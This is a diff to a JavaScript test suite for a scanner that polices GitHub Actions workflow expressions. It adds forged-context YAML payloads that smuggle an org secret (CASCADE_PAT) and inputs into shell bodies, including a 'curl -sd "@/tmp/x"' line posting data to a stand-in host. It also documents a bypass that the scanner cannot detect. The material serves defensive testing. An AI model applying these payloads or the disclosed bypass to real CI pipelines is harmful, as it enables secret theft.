@@ -114,6 +114,7 @@ const sweep = (file, text, allowlist = EXPRESSION_ALLOWLIST, escapes = ESCAPE_AL
 const UNPINNED = /No allowlist entry in test\/helpers\/expression-allowlist\.js pins that expression/;
 const DEAD = /expression-allowlist\.js is dead/;
 const CONSTRUCTED = /an opener can be CONSTRUCTED with no literal \$\{\{ in the bytes/;
+const CHAIN_SEPARATOR = ' > ';
 
 describe('G1 -- the raw ${{ }} guarantee is green on the workflows that ship (#37)', () => {
   // AC5's successor. If this ever reds on an unmodified workflow the blast
@@ -509,7 +510,7 @@ const ALLOWLIST_AT_E07E185 = {
   'security-audit.yml': [
     {
       line: 'version: ${{ inputs.pnpm-version }}',
-      context: 'with',
+      context: 'jobs > audit > steps > with',
       expression: '${{ inputs.pnpm-version }}',
       occurrences: 1,
       why: 'inputs.pnpm-version reaching pnpm/action-setup\'s `version:` input in the audit job. An action '
@@ -517,7 +518,7 @@ const ALLOWLIST_AT_E07E185 = {
     },
     {
       line: 'node-version: ${{ inputs.node-version }}',
-      context: 'with',
+      context: 'jobs > audit > steps > with',
       expression: '${{ inputs.node-version }}',
       occurrences: 1,
       why: 'inputs.node-version reaching actions/setup-node\'s `node-version:` input in the audit job. An '
@@ -525,7 +526,7 @@ const ALLOWLIST_AT_E07E185 = {
     },
     {
       line: 'run: pnpm audit --audit-level ${{ inputs.audit-level }}',
-      context: 'steps',
+      context: 'jobs > audit > steps',
       expression: '${{ inputs.audit-level }}',
       occurrences: 1,
       why: 'KNOWN OPEN SINK, tracked as abofs/stonyx-workflows#34: inputs.audit-level is a workflow_call '
@@ -1074,6 +1075,127 @@ describe('G1 -- an exemption cannot follow its line into a different sink (#37)'
     assertReports(sweep('cascade.yml', mutated), UNPINNED, 'a credential in shell source is not an action input');
   });
 
+  // THE FORGERIES. Round 4 measured that the context field, being derived from
+  // the same untrusted bytes it polices, is SUPPLIED BY THE PAYLOAD: a `with:`
+  // line written inside a `run:` body makes every line indented under it read
+  // `with`, which is exactly what an entry for an action input pins. Phases 1
+  // and 3 found this independently, in two files, and every layer was green --
+  // guarantee `[]`, 282 pass / 0 fail, with the org-level `CASCADE_PAT` in a
+  // shell body and with the committed F5 case above asserting that this exact
+  // relocation must red.
+  //
+  // Each payload below is the reviewer's, verbatim. Each must red ON THE
+  // GUARANTEE -- twice, in fact: the forged position has no entry, and the
+  // entry it was written for is now dead.
+  const FORGERIES = [
+    ['F7  (Phase 1) an explicit `? run` key, forged `with:`, org PAT in a shell body', 'cascade.yml',
+      cascade.replace('        token: ${{ secrets.CASCADE_PAT }}\n', ''), step(
+        '      - name: Leak',
+        '        ? run',
+        '        : |',
+        '          with:',
+        '            token: ${{ secrets.CASCADE_PAT }}',
+        '          curl -sd "@/tmp/x" https://example.invalid',
+      )],
+    ['G1  (Phase 3) a multi-line double-quoted `run:`, forged `with:`', 'ci.yml',
+      ci.replace('          node-version: ${{ inputs.node-version }}', "          node-version: '24.13.0'"), step(
+        '      - name: Forged context dq',
+        '        run: "true',
+        '          with:',
+        '            node-version: ${{ inputs.node-version }}',
+        '          "',
+      )],
+    ['G3  (Phase 3) an ordinary `run: |`, forged `with:` -- the guarantee, not the diagnostics', 'ci.yml',
+      ci.replace('          node-version: ${{ inputs.node-version }}', "          node-version: '24.13.0'"), step(
+        '      - name: Forged context block',
+        '        run: |',
+        '          with:',
+        '            node-version: ${{ inputs.node-version }}',
+      )],
+    ['G5  (Phase 3) forged `with:` inside a github-script `script:` body', 'cascade.yml',
+      cascade.replace('        token: ${{ secrets.CASCADE_PAT }}\n', ''), step(
+        '      - name: Forged script context',
+        '        uses: actions/github-script@v7',
+        '        with:',
+        '          script: |',
+        '            with:',
+        '              token: ${{ secrets.CASCADE_PAT }}',
+      )],
+  ];
+
+  for (const [label, file, defanged, forgery] of FORGERIES) {
+    test(`${label} -- the payload cannot supply its own context`, () => {
+      assert.notEqual(defanged, readWorkflowFile(file), 'the defanging replacement must actually have applied');
+      const problems = sweep(file, appendStep(defanged, forgery));
+      assertReports(problems, UNPINNED, 'a line inside a body is not an action input, whatever it spells');
+      assertReports(problems, DEAD, 'and the entry it was written for now matches nothing');
+    });
+  }
+
+  test('DISCLOSED GAP: a multi-line flow scalar can still forge the chain, and this is fail-OPEN', () => {
+    // THE DOMAIN, AND WHERE IT RUNS OUT. The question the fix had to answer is
+    // "which lines can legitimately establish context", and the answer turns on
+    // one property measured against Psych / libyaml 5.3.1: can a scalar's
+    // content sit at an indentation LESS THAN OR EQUAL TO its own key line's?
+    //
+    //   literal block `|`  NO   folded block `>`  NO   plain multi-line  NO
+    //   double-quoted      YES  single-quoted     YES  flow map / seq    YES
+    //
+    // The three NO styles are closed by the chain and by the `(scalar)` link,
+    // and the four payloads above are all of them. For the YES styles a
+    // continuation may sit at EXACTLY the indentation a legitimate key would
+    // occupy, so a payload can reproduce a legitimate ladder link for link, and
+    // no function of indentation and colons can tell the difference -- at the
+    // byte level the forged lines ARE what a real key looks like. Closing it
+    // needs a parser; the guarantee does not parse.
+    //
+    // The payload below is valid YAML (Psych: `run` resolves to
+    // `true with: node-version: ${{ inputs.node-version }} `, a shell string
+    // carrying a live expression) and the guarantee returns `[]`.
+    //
+    // THIS CASE ASSERTS THE GAP, so that it is visible here and not only in
+    // README.md's Honest gaps. If it ever starts redding, the gap has closed
+    // and the disclosure has to be rewritten -- deliberately, not silently.
+    const defanged = ci.replace(
+      '          node-version: ${{ inputs.node-version }}',
+      "          node-version: '24.13.0'",
+    );
+    const forged = appendStep(defanged, step(
+      '      - name: Forged context dedent',
+      '        run: "true',
+      '        with:',
+      '          node-version: ${{ inputs.node-version }}',
+      '        "',
+    ));
+    assert.notEqual(defanged, ci, 'the defanging replacement must actually have applied');
+    assert.deepEqual(
+      sweep('ci.yml', forged),
+      [],
+      'DISCLOSED: a double-quoted continuation dedented to exactly the key indent reproduces the legitimate '
+      + 'chain, so the existing entry matches the forged line and NOTHING is reported -- not even a dead entry, '
+      + 'because the entry is not dead. If this now reds, the gap has closed: update README.md Honest gaps and '
+      + 'the module header deliberately rather than deleting this case',
+    );
+    // Stated exactly, because the first draft of this case claimed the vacated
+    // entry would still be reported dead and the assertion refused it: the
+    // forgery is COMPLETE. The shell line's derived context is byte-identical
+    // to the action input's, which is why the existing entry covers it.
+    //
+    // Derived on both sides rather than snapshotted -- a literal list of the
+    // file's contexts here would red on the next expression anyone adds to
+    // `ci.yml`, which is the churn-tripwire class this round deleted twice.
+    const contextOf = (text, needle) => {
+      const found = rawExpressions(text).filter((e) => e.line.includes(needle));
+      assert.equal(found.length, 1, `${needle} must occur once in this text`);
+      return found[0].context;
+    };
+    assert.equal(
+      contextOf(forged, 'node-version: ${{ inputs.node-version }}'),
+      contextOf(ci, 'node-version: ${{ inputs.node-version }}'),
+      'the shell line and the action input derive the same context, which is what makes the entry match',
+    );
+  });
+
   test('N15: an allowlisted env: line relocated verbatim into a run: body reds', () => {
     const stripped = cascade.replace('          PACKAGE_NAME: ${{ inputs.package-name }}\n', '');
     assert.notEqual(stripped, cascade, 'the removal must actually have applied');
@@ -1095,27 +1217,71 @@ describe('G1 -- an exemption cannot follow its line into a different sink (#37)'
     );
     assert.notEqual(indented, ci, 'the re-indent must actually have applied');
     assert.deepEqual(sweep('ci.yml', indented), [], 're-indenting inside the same key must not red');
-
-    const contexts = structuralContexts(ci);
-    const lines = ci.split('\n');
-    const at = lines.findIndex((l) => l.includes('version: ${{ inputs.pnpm-version }}'));
-    assert.equal(contexts[at], 'with', 'the pnpm version input is written under with:');
-    assert.equal(structuralContexts('a:\n  b: 1\n')[0], '(top level)', 'a line with no enclosing key says so');
   });
 
-  test('calibration: every live entry states the context its line is actually written under', () => {
+  test('the chain is read off the raw text, and these are the chains, hand-read', () => {
+    // FACTS ABOUT THE FILES, WRITTEN BY HAND rather than captured from the
+    // function's own output. Everything else that mentions a context -- the 36
+    // `context:` fields -- was derived from `structuralContexts`, so it agrees
+    // with the function by construction and constrains DRIFT but not
+    // CORRECTNESS (#37, Phase 4 NEW-6, which measured three mutations of
+    // `keyOf`/`contentIndent` at 282 pass / 0 fail against two hand-written
+    // facts). One per context kind, read off the file with a text editor.
+    const chainOf = (file, needle) => {
+      const text = readWorkflowFile(file);
+      const at = text.split('\n').findIndex((l) => l.includes(needle));
+      assert.notEqual(at, -1, `${needle} must still be in ${file}`);
+      return structuralContexts(text)[at];
+    };
+
+    assert.equal(chainOf('ci.yml', 'version: ${{ inputs.pnpm-version }}'), 'jobs > test > steps > with');
+    assert.equal(chainOf('cascade.yml', 'PACKAGE_NAME: ${{ inputs.package-name }}'), 'jobs > dispatch > steps > env');
+    assert.equal(
+      chainOf('security-audit.yml', 'run: pnpm audit --audit-level'),
+      'jobs > audit > steps',
+      'a step key sits directly under steps:, not under the step name',
+    );
+    assert.equal(chainOf('npm-publish.yml', 'published-version:'), 'on > workflow_call > outputs');
+    assert.equal(chainOf('self-ci.yml', 'group: self-ci-'), 'concurrency');
+
+    // The boundaries: nothing encloses a top-level line, and a `(scalar)` link
+    // is what a key that already carries a value contributes.
+    assert.equal(structuralContexts('a:\n  b: 1\n')[0], '(top level)', 'a line with no enclosing key says so');
+    assert.equal(structuralContexts('a:\n  b: 1\n')[1], 'a');
+    assert.equal(structuralContexts('a: 1\n  b: 2\n')[1], 'a (scalar)', 'a key with a value cannot open a mapping');
+    assert.equal(structuralContexts('run: |\n  x: 1\n')[1], 'run (scalar)', 'and a block scalar opens no mapping');
+  });
+
+  test('calibration: the context field discriminates, and the live values are derived', () => {
     // Vacuity guard on the field itself. If `structuralContexts` ever returned
-    // one constant, every entry would still match and this suite would be
-    // green on a key that discriminates nothing.
+    // one constant, every entry would still match and this suite would be green
+    // on a key that discriminates nothing.
+    //
+    // WHAT USED TO BE HERE was a `deepEqual` against the eight context names the
+    // five shipped files happen to use. That was a snapshot of the function's
+    // own output, and it was the THIRD RECURRENCE of the churn-tripwire class
+    // in this PR -- recreated in the commit that removed the other two. Measured:
+    // a correctly-allowlisted job-level `if:` was 281 pass / 1 fail, and
+    // reaching 282/0 needed a third edit in a third file, contradicting the
+    // two-edits-in-two-files contract the README states (#37, Phase 4 NEW-3).
+    // The expected set is DERIVED from the allowlist's own `context` values,
+    // which the guarantee already requires to match, so it moves with the file.
     const seen = new Set();
     for (const file of workflowFileNames()) {
       for (const { context } of rawExpressions(readWorkflowFile(file))) seen.add(context);
     }
+    const pinned = new Set(Object.values(EXPRESSION_ALLOWLIST).flat().map((e) => e.context));
+
     assert.ok(seen.size > 1, 'a context that is the same everywhere is not a context');
-    assert.deepEqual(
-      [...seen].sort(),
-      ['concurrency', 'env', 'outputs', 'package-name', 'published-version', 'steps', 'version-channel', 'with'],
-      'and the contexts the shipped workflows use are these',
+    assert.deepEqual([...seen].sort(), [...pinned].sort(), 'every derived context is a context an entry states');
+    assert.ok(
+      [...seen].every((c) => c.includes(CHAIN_SEPARATOR) || c === 'concurrency'),
+      'a live context is a chain of enclosing keys; only a top-level key is one segment long',
+    );
+    assert.ok(
+      [...seen].every((c) => !c.includes('(scalar)')),
+      'and no live occurrence sits under a key that already carries a value -- if one does, either the file '
+      + 'grew a shape this scanner does not model, or a payload is writing its own context',
     );
   });
 });
